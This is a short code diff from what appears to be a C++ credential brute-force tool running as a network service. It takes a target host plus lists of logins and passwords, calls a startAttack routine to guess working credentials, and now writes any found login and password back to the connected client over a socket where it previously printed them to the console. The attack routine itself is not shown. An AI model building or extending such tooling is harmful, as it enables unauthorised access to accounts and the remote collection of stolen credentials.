@@ -103,12 +103,16 @@ int main(int argc, char *argv[]){
 	    if(isHostFound && isLoginsFound && isPasswordsFound){
 	    	string login;
 	    	string password;
-		    startAttack(hostName, logins, passwords, login, password);
-		    cout<<"found login ="<<login<<endl;
-		    cout<<"found password ="<<password<<endl;
-		    isHostFound = false;
-		    isLoginsFound = false;
-		    isPasswordsFound = false;
+	        startAttack(hostName, logins, passwords, login, password);
+	        if(!login.empty() && !password.empty()){
+		    string sendData = "found login " + login + "found password " + password + "\n";
+	            write(newsockfd, sendData.c_str(), sendData.length());
+	        } else{
+	            write(newsockfd, "There was no corresponding login and password", 45);
+	        }
+		isHostFound = false;
+		isLoginsFound = false;
+		isPasswordsFound = false;
 	    }
     }
     close(newsockfd);
